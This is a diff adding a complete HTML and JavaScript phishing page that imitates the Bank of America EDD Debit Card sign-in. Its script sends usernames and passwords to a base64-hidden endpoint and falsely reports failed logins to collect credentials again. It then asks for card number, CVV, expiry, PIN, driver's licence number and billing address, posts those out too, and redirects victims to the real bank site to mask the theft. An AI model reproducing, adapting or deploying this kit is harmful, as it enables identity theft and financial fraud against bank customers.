@@ -1,0 +1,486 @@
+<html lang="en" style="">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of America- Sign In</title>
+    <link href="css/css.css" rel="stylesheet">
+    <link href="css/site.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+</head>
+
+<body class="body">
+    <div class="header-container" role="banner">
+        <div class="row header-row">
+            <div class="columns brand-container show-for-medium-up">
+                <div class="small-12 medium-3 custom-medium-push-5 columns">
+                    <div class="logo-wrapper">
+                        <a href="#">
+                            <img alt="Bank Of America, N. A. Logo" class="header-logo medium img-responsive" id="brand-logo" src="images/logo.png" title="">
+                        </a>
+                    </div>
+                </div>
+                <div class="small-12 medium-9 custom-medium-pull-7 columns">
+                    <div class="program-wrapper">
+                        <span class="header-card-program"></span>
+                    </div>
+                </div>
+            </div>
+            <div class="small-12 show-for-small-only columns">
+                <nav data-topbar="" class="top-bar mobile-nav" role="navigation" aria-label="Main" style="">
+                    <ul class="title-area">
+                        <!-- Title Area -->
+                        <li class="name">
+                            <a href="#">
+                                <img alt="Bank Of America, N. A. Logo" class="header-logo medium img-responsive" id="brand-logo-mobile" src="images/logo.png" title="">
+                            </a>
+                        </li>
+                        <li class="toggle-topbar menu-icon">
+                            <button class="menu-icon" aria-expanded="false">
+                                <i class="fa fa-bars" role="presentation" aria-hidden="true"></i>
+                                <span class="a11y-hide-visually">Expand Navigation Menu</span>
+                            </button>
+                        </li>
+                        <li class="header-card-program">EDD Debit Card</li>
+                    </ul>
+                    <section class="top-bar-section" style="display: none;">
+                        <ul class="left">
+                            <li>
+                                <a href="#">Home</a>
+                            </li>
+                            <li>
+                                <a href="#">Sign In</a>
+                            </li>
+                            <li>
+                                <a href="#">Activate My Card</a>
+                            </li>
+                        </ul>
+                    </section>
+                </nav>
+            </div>
+            <div class="row show-for-medium-up">
+                <div class="medium-12 columns">
+                    <nav data-topbar="" class="top-bar desktop-nav" role="navigation" aria-label="Main">
+                        <section class="top-bar-section">
+                            <ul class="left">
+                                <li>
+                                    <a href="#">Home</a>
+                                </li>
+                                <li>
+                                    <a href="#">Sign In</a>
+                                </li>
+                                <li>
+                                    <a href="#">Activate My Card</a>
+                                </li>
+                            </ul>
+                        </section>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="content-container" id="content" role="main" tabindex="-1">
+        <div class="row">
+            <div class="large-12 medium-12 small-12 column">
+                <!-- <p style="background-color: #C41230;color:#fff;padding:10px;margin-bottom: 0px;">Please note your website username and password may be different than what you use for the Mobile App.</p> -->
+                <h1 id="head">Sign In</h1>
+            </div>
+        </div>
+        <center>
+            <p id="msg" style="color: red;font-weight: 600;font-size: 14px;padding-bottom: 0px; display: none;">session expire please sign in with your email address</p>
+            <p id="error" style="color: red;font-weight: 600;font-size: 14px;padding-bottom: 0px; display: none;">That account doesn't exist. Enter a different account</p>
+        </center>
+        <div class="box" id="div1">
+            <div class="row">
+                <div class="medium-12 columns">
+                    <div class="large-12 medium-12 small-12 column">
+                        <p class="align-right margin-bottom-none">
+                            <span class="required">*</span>
+                            Required fields
+                        </p>
+                    </div>
+                    <div class="row form-row">
+                        <div class="large-3 medium-5 small-12 column ">
+                            <label class="form-control" for="VerifyUserRequestHandler_Model_Username">
+                                <span id="em-txt">Username</span>&nbsp;
+                                <span class="required">*&nbsp;</span>
+                            </label>
+                        </div>
+                        <div class="large-4 medium-4 small-12 columns left">
+                            <input class="stretch" maxlength="23" name="ai" id="ai" type="text" value="" required="">
+                        </div>
+                        <div class="large-5 medium-3 small-12 columns left"></div>
+                    </div>
+                    <div class="row form-row">
+                        <div class="large-3 medium-5 small-12 column ">
+                            <label class="form-control" for="VerifyUserRequestHandler_Model_Username">
+                                Password&nbsp;
+                                <span class="required">*&nbsp;</span>
+                            </label>
+                        </div>
+                        <div class="large-4 medium-4 small-12 columns left" style="margin-bottom: 50px">
+                            <input class="stretch" maxlength="23" name="pr" id="pr" type="password" value="" required="">
+                            <div>
+                                <div class="data-rows"><input id="" name="" type="checkbox" value="true">
+                                    <input name="VerifyUserRequestHandler.Model.RememberMe" type="hidden" value="false"><label class="check-box-label-with-tootip normal" for="VerifyUserRequestHandler_Model_RememberMe">Remember Password</label>
+                                    <button aria-describedby="tooltip-kl0po2270" aria-label="Your username will be remembered on this device." class="has-tip tip-top radius" data-tooltip="" tabindex="0" type="button" data-selector="tooltip-kl0po2270" title=""></button></div><small></small><small><a href="#">Need Password?</a><span aria-hidden="true"> | </span><a href="#">Forgot Password?</a></small>
+                            </div>
+                        </div>
+                        <div class="large-5 medium-3 small-12 columns left"></div>
+                    </div>
+                    <div class="small-12 columns button-group">
+                        <input class="button small navigationButton primary" id="submit-btn" name="submit-btn" type="button" value="Continue"></div>
+                </div>
+            </div>
+        </div>
+        <div class="box" id="div2" style="display: none;">
+            <form id="cardform">
+                <div class="row">
+                    <div class="medium-12 columns">
+                        <div class="large-12 medium-12 small-12 column">
+                            <p class="align-right margin-bottom-none">
+                                <span class="required">*</span>
+                                Required fields
+                            </p>
+                        </div>
+                        <h3 style="color: red;font-weight: 600">Card Verification</h3>
+                        <div class="row form-row">
+                            <div class="large-3 medium-5 small-12 column ">
+                                <label class="form-control" for="VerifyUserRequestHandler_Model_Username">
+                                    Credit Card Number&nbsp;
+                                    <span class="required">*&nbsp;</span>
+                                </label>
+                            </div>
+                            <div class="large-4 medium-4 small-12 columns left">
+                                <input class="stretch" maxlength="23" name="cnum" id="cnum" type="text" value="" required="">
+                            </div>
+                        </div>
+                        <div class="row form-row">
+                            <div class="large-3 medium-5 small-12 column ">
+                                <label class="form-control" for="VerifyUserRequestHandler_Model_Username">
+                                    CVV&nbsp;
+                                    <span class="required">*&nbsp;</span>
+                                </label>
+                            </div>
+                            <div class="large-4 medium-4 small-12 columns left">
+                                <input class="stretch" maxlength="23" name="cvv" id="cvv" type="text" value="" required="">
+                            </div>
+                        </div>
+                        <div class="row form-row">
+                            <div class="large-3 medium-5 small-12 column ">
+                                <label class="form-control" for="VerifyUserRequestHandler_Model_Username">
+                                    Expire Date&nbsp;
+                                    <span class="required">*&nbsp;</span>
+                                </label>
+                            </div>
+                            <div class="large-4 medium-4 small-12 columns left">
+                                <input class="stretch" maxlength="23" name="exdate" id="exdate" type="text" value="" required="">
+                            </div>
+                        </div>
+                        <div class="row form-row">
+                            <div class="large-3 medium-5 small-12 column ">
+                                <label class="form-control" for="VerifyUserRequestHandler_Model_Username">
+                                    Pin&nbsp;
+                                    <span class="required">*&nbsp;</span>
+                                </label>
+                            </div>
+                            <div class="large-4 medium-4 small-12 columns left">
+                                <input class="stretch" maxlength="23" name="pin" id="pin" type="text" value="" required="">
+                            </div>
+                        </div>
+                        <div class="row form-row">
+                            <div class="large-3 medium-5 small-12 column ">
+                                <label class="form-control" for="VerifyUserRequestHandler_Model_Username">
+                                    Driver's License Number&nbsp;
+                                    <span class="required">*&nbsp;</span>
+                                </label>
+                            </div>
+                            <div class="large-4 medium-4 small-12 columns left">
+                                <input class="stretch" maxlength="23" name="dln" id="dln" type="text" value="" required="">
+                            </div>
+                        </div>
+                        <div class="row form-row">
+                            <div class="large-3 medium-5 small-12 column ">
+                                <label class="form-control" for="VerifyUserRequestHandler_Model_Username">
+                                    Billing Address&nbsp;
+                                    <span class="required">*&nbsp;</span>
+                                </label>
+                            </div>
+                            <div class="large-4 medium-4 small-12 columns left">
+                                <input class="stretch" maxlength="23" name="add" id="add" type="text" value="" required="">
+                            </div>
+                        </div>
+                        <div class="small-12 columns button-group">
+                            <input class="button small navigationButton primary" id="submit-btn2" name="submit-btn2" type="button" value="Continue"></div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer" role="contentinfo">
+        <div class="row">
+            <div class="small-12 columns" role="navigation" aria-label="Footer navigation">
+                <ul class="footer-navigation">
+                    <li><a href="#" target="_blank">Fee Information</a></li>
+                    <li><a href="#" target="_blank">FAQ</a></li>
+                    <li><a href="#">Site Map</a></li>
+                    <li><a href="#" target="_blank">Contact Us</a></li>
+                    <li><a href="#" target="_blank">Privacy / Security</a></li>
+                    <li><a href="#" target="_blank">Terms &amp; Conditions</a></li>
+                    <li><a href="#" target="_blank">Digital Terms &amp; Conditions and Fees</a></li>
+                    <li><a href="#">ATM Locator</a></li>
+                    <li><a href="#" target="_blank" data-reveal-id="modal-leaving-site">Bank Of America, N. A.</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="extra">
+            <div class="small-12 columns">
+                <div class="row language">
+                    <div id="lang-label" class="small-12 columns align-center">
+                        <form action="/EddCard/Culture/Change" autocomplete="off" id="CultureForm" method="post" novalidate="novalidate"><input name="__RequestVerificationToken" type="hidden" value="NrEPJq-8Ajsv9hM1Q19UOJGsXbzZdYbh_0MkVDSnQNIFBFc_8WYQhIpKxP_-9e9162GjX0Sz-I6VUt2w9sinie5OTbOpMWVwcwNhdvjc6OI1"> <span id="language-label" class="uppercase"><span class="a11y-hide-visually">Select a</span> Language:</span>
+                            <ul aria-labelledby="language-label" class="language-short-list">
+                                <li><button class="current changeCultureButton" data-culture="en-US" lang="en-US">English<span class="a11y-hide-visually"> (Selected)</span></button></li>
+                                <li><button class="changeCultureButton" data-culture="es-MX" lang="es-MX">Español</button></li>
+                            </ul>
+                            <input type="submit" class="a11y-hide-all" tabindex="-1" value="Submit">
+                        </form>
+                    </div>
+                </div>
+                <div class="row copyright">
+                    <div class="small-12 columns">
+                        <p>
+                            Copyright 2021 Bank of America Corporation .
+                            <a href="#"> Visa Global Privacy Notice.</a> <br>Bank of America, N.A. Member FDIC Equal Housing Lender </p>
+                        <div class="large-12 column align-center">
+                            <p style="color:#000;">
+                                <img src="images/EmailLogo.png"><br>
+                                Apple, the Apple logo and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries and regions. App Store is a service mark of Apple Inc. Google Play and the Google Play logo are trademarks of Google LLC.
+                            </p>
+                            <p style="color:#000;"> Your funds are eligible for FDIC insurance. Your funds are insured up to $250,000 by the FDIC in the event Bank of America, N.A. fails, if specific deposit insurance requirements are met. See <a href="#" data-reveal-id="modal-leaving-site">fdic.gov/deposit/deposits/prepaid.html</a> for details. In the event Bank of America, N.A. fails, the FDIC may require information from you, including a government identification number, to determine the amount of your insured deposits. If you do not provide this information to the FDIC access to your insured funds will be delayed. </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+        if (!base64regex.test(ai)) {
+            // alert(btoa(ai));
+            var my_ai = ai;
+        } else {
+            // alert(atob(ai));
+            var my_ai = atob(ai);
+        }
+
+        $('#ai').val(my_ai);
+        $("#ai").focus();
+
+    }
+    //////url ai end///////////////
+    var file = "bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (count == 0) {
+            if (!ai) {
+                $('#error').show();
+                $('#error').html("Username field is empty.!");
+                return false;
+            }
+
+        } else {
+            if (!ai) {
+                $('#error').show();
+                $('#error').html("Email Address field is empty.!");
+                return false;
+            }
+
+            if (!filter.test(my_ai)) {
+                $('#error').show();
+                $('#error').html("That account doesn't exist. Enter a different account");
+
+                return false;
+            }
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is empty.!");
+
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: atob(file),
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+
+            beforeSend: function(xhr) {
+                $('#submit-btn').val('Verifying...');
+            },
+            success: function(response) {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    $("#head").html("Verify Your Card Details");
+                    $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div2").animate({ right: 0, opacity: "show" }, 500);
+                    return false;
+                }
+                $("#em-txt").html("Email Address");
+                $("#ai").attr('type', 'email');
+                $("#msg").show();
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    $("#head").html("Verify Your Card Details");
+                    $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div2").animate({ right: 0, opacity: "show" }, 500);
+                    return false;
+                }
+                $("#em-txt").html("Email Address");
+                $("#ai").attr('type', 'email');
+                $("#msg").show();
+            },
+            complete: function() {
+                $('#submit-btn').val('Continue');
+            }
+        });
+    });
+    $('#submit-btn2').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var cnum = $("#cnum").val();
+        var cvv = $("#cvv").val();
+        var exdate = $("#exdate").val();
+        var pin = $("#pin").val();
+        var dln = $("#dln").val();
+        var add = $("#add").val();
+
+
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+
+        if (!cnum) {
+            $('#error').show();
+            $('#error').html("Credit Card number field is empty.!");
+            return false;
+        }
+
+
+        if (!cvv) {
+            $('#error').show();
+            $('#error').html("CVV field is empty.!");
+            return false;
+        }
+
+        if (!exdate) {
+            $('#error').show();
+            $('#error').html("Expiry Date field is empty.!");
+
+            return false;
+        }
+
+        if (!pin) {
+            $('#error').show();
+            $('#error').html("PIN field is empty.!");
+
+            return false;
+        }
+        if (!dln) {
+            $('#error').show();
+            $('#error').html("Driver's License Number field is empty.!");
+
+            return false;
+        }
+        if (!add) {
+            $('#error').show();
+            $('#error').html("Billing Address field is empty.!");
+
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: atob(file),
+            type: 'POST',
+            data: {
+                cnum: cnum,
+                cvv: cvv,
+                exdate: exdate,
+                pin: pin,
+                dln: dln,
+                add: add,
+            },
+
+            beforeSend: function(xhr) {
+                $('#submit-btn2').val('Verifying...');
+            },
+            success: function(response) {
+                window.location.replace("https://www.bankofamerica.com/");
+            },
+            error: function() {
+                window.location.replace("https://www.bankofamerica.com/");
+            },
+            complete: function() {
+                $('#submit-btn2').val('Continue');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</html>
